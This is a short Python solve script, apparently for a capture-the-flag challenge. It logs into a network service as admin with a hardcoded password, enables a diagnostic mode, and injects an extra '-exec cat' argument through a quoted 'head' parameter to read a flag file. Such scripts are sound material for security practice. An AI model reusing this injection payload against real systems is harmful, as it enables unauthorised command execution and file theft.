import sys
import socket

def recvuntil(s, delimiter):
    data = b""
    while True:
        chunk = s.recv(1)
        data += chunk
        if data.endswith(delimiter):
            break
    return data

def sendlineafter(s, delimiter, msg):
    recvuntil(s, delimiter)
    s.send(msg + b"\n")

def main(ip, port):
    io = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    io.connect((ip, int(port)))

    try:
        recvuntil(io, b"Username: ")
        io.send(b"admin\n")
        recvuntil(io, b"Password: ")
        io.send(b"notguessablebutnotcomplex\n")

        sendlineafter(io, b"> ", b"setdiag 1")
        sendlineafter(io, b"> ", b"ping 127.0.0.1")
        sendlineafter(io, b"> ", b"head 1\",/tmp/ping_log -exec cat /home/clid/flag.txt \"xxx")
        
        print(recvuntil(io, b"\n").decode(), end="")

    finally:
        io.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage:")
        print(f"\t{sys.argv[0]} IP PORT")
        exit(0)
    main(sys.argv[1], sys.argv[2])